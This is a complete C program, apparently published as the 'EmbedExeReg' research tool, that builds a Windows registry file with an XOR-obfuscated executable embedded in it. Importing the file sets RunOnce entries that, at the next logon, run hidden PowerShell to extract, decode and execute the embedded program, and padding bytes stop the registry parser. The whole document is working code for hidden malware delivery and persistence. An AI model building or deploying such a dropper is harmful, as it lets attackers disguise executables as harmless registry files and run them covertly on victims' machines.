#include <stdio.h>
#include <windows.h>

#pragma warning(disable:4996)
#define _CRT_SECURE_NO_WARNINGS

DWORD CreateRegFile(char* pExePath, char* pOutputRegPath)
{
	char szRegEntry[1024];
	char szBatEntry[1024];
	char szStartupName[64];
	BYTE bXorEncryptValue = 0;
	HANDLE hRegFile = NULL;
	HANDLE hExeFile = NULL;
	DWORD dwExeFileSize = 0;
	DWORD dwTotalFileSize = 0;
	DWORD dwExeFileOffset = 0;
	BYTE* pCmdLinePtr = NULL;
	DWORD dwBytesRead = 0;
	DWORD dwBytesWritten = 0;
	char szOverwriteSearchRegFileSizeValue[16];
	char szOverwriteSkipBytesValue[16];
	BYTE bExeDataBuffer[1024];

	// set xor encrypt value
	bXorEncryptValue = 0x77;

	// set startup entry name
	memset(szStartupName, 0, sizeof(szStartupName));
	strncpy(szStartupName, "startup_entry", sizeof(szStartupName) - 1);

	// generate reg file data (append 0xFF characters at the end to ensure the registry parser breaks after importing the first entry)
	memset(szRegEntry, 0, sizeof(szRegEntry));
	_snprintf(szRegEntry, sizeof(szRegEntry) - 1,
		"REGEDIT4\r\n"
		"\r\n"
		"[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce]\r\n"
		"\"%s\"=\"cmd /c powershell -windowstyle hidden \\\"$r=gci -Path C:\\\\ -Recurse *.reg | where-object {$_.length -eq 0x00000000} | select -ExpandProperty FullName -First 1; $t=[System.IO.Path]::GetTempPath(); $b=$t+'\\\\tmpreg.bat'; Copy-Item $r -Destination $b; & $b;\\\"\"\r\n"
		"\"startup_entry2\"=\"cmd /c more +7 %%temp%%\\\\tmpreg.bat > %%temp%%\\\\tmpreg2.bat & %%temp%%\\\\tmpreg2.bat\"\r\n"
		"\r\n"
		"\xFF\xFF\r\n"
		"\r\n", szStartupName);

	// generate bat file data
	memset(szBatEntry, 0, sizeof(szBatEntry));
	_snprintf(szBatEntry, sizeof(szBatEntry) - 1,
		"cmd /c powershell -windowstyle hidden \"$temp = [System.IO.Path]::GetTempPath(); $filename = $temp + '\\\\tmpreg.bat'; $file = gc $filename -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $path = $temp + '\\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file | select -Skip 000000)) -Encoding Byte; & $path;\"\r\n"
		"exit\r\n", bXorEncryptValue);

	// create output reg file
	hRegFile = CreateFile(pOutputRegPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hRegFile == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create output file\n");

		return 1;
	}

	// open target exe file
	hExeFile = CreateFile(pExePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hExeFile == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open exe file\n");

		// error
		CloseHandle(hRegFile);

		return 1;
	}

	// store exe file size
	dwExeFileSize = GetFileSize(hExeFile, NULL);

	// calculate total file size
	dwTotalFileSize = strlen(szRegEntry) + strlen(szBatEntry) + dwExeFileSize;
	memset(szOverwriteSearchRegFileSizeValue, 0, sizeof(szOverwriteSearchRegFileSizeValue));
	_snprintf(szOverwriteSearchRegFileSizeValue, sizeof(szOverwriteSearchRegFileSizeValue) - 1, "0x%08X", dwTotalFileSize);

	// calculate exe file offset
	dwExeFileOffset = dwTotalFileSize - dwExeFileSize;
	memset(szOverwriteSkipBytesValue, 0, sizeof(szOverwriteSkipBytesValue));
	_snprintf(szOverwriteSkipBytesValue, sizeof(szOverwriteSkipBytesValue) - 1, "%06u", dwExeFileOffset);

	// find the offset value of the total reg file length in the command-line arguments
	pCmdLinePtr = (BYTE*)strstr(szRegEntry, "_.length -eq 0x00000000}");
	if (pCmdLinePtr == NULL)
	{
		// error
		CloseHandle(hExeFile);
		CloseHandle(hRegFile);

		return 1;
	}
	pCmdLinePtr += strlen("_.length -eq ");

	// update value
	memcpy((void*)pCmdLinePtr, (void*)szOverwriteSearchRegFileSizeValue, strlen(szOverwriteSearchRegFileSizeValue));

	// find the offset value of the number of bytes to skip in the command-line arguments
	pCmdLinePtr = (BYTE*)strstr(szBatEntry, "select -Skip 000000)");
	if (pCmdLinePtr == NULL)
	{
		// error
		CloseHandle(hExeFile);
		CloseHandle(hRegFile);

		return 1;
	}
	pCmdLinePtr += strlen("select -Skip ");

	// update value
	memcpy((void*)pCmdLinePtr, (void*)szOverwriteSkipBytesValue, strlen(szOverwriteSkipBytesValue));

	// write szRegEntry
	if (WriteFile(hRegFile, (void*)szRegEntry, strlen(szRegEntry), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hExeFile);
		CloseHandle(hRegFile);

		return 1;
	}

	// write szBatEntry
	if (WriteFile(hRegFile, (void*)szBatEntry, strlen(szBatEntry), &dwBytesWritten, NULL) == 0)
	{
		// error
		CloseHandle(hExeFile);
		CloseHandle(hRegFile);

		return 1;
	}

	// append exe file to the end of the reg file
	for (;;)
	{
		// read data from exe file
		if (ReadFile(hExeFile, bExeDataBuffer, sizeof(bExeDataBuffer), &dwBytesRead, NULL) == 0)
		{
			// error
			CloseHandle(hExeFile);
			CloseHandle(hRegFile);

			return 1;
		}

		// check for end of file
		if (dwBytesRead == 0)
		{
			break;
		}

		// "encrypt" the exe file data
		for (DWORD i = 0; i < dwBytesRead; i++)
		{
			bExeDataBuffer[i] ^= bXorEncryptValue;
		}

		// write data to reg file
		if (WriteFile(hRegFile, bExeDataBuffer, dwBytesRead, &dwBytesWritten, NULL) == 0)
		{
			// error
			CloseHandle(hExeFile);
			CloseHandle(hRegFile);

			return 1;
		}
	}

	// close exe file handle
	CloseHandle(hExeFile);

	// close output file handle
	CloseHandle(hRegFile);

	return 0;
}

int main(int argc, char* argv[])
{
	char* pExePath = NULL;
	char* pOutputRegPath = NULL;

	printf("EmbedExeReg - www.x86matthew.com\n\n");

	if (argc != 3)
	{
		printf("Usage: %s [exe_path] [output_reg_path]\n\n", argv[0]);

		return 1;
	}

	// get params
	pExePath = argv[1];
	pOutputRegPath = argv[2];

	// create a reg file containing the target exe
	if (CreateRegFile(pExePath, pOutputRegPath) != 0)
	{
		printf("Error\n");

		return 1;
	}

	printf("Finished\n");

	return 0;
}